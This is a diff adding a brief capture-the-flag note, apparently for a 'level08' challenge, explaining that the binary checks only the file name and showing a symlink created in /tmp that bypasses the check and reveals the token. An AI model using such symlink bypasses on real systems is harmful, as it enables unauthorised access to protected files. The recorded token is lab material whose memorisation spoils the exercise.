@@ -1,0 +1,10 @@
+Trying to run 'level08' with 'token' file prints an access error, and just by using a symlink to the token file bypasses the check
+The binary checks just the file name.
+
+./level08 token 
+You may not access 'token'
+ln -s ~/token /tmp/file
+./level08 /tmp/file
+quif5eloekouj29ke0vouxean
+
+
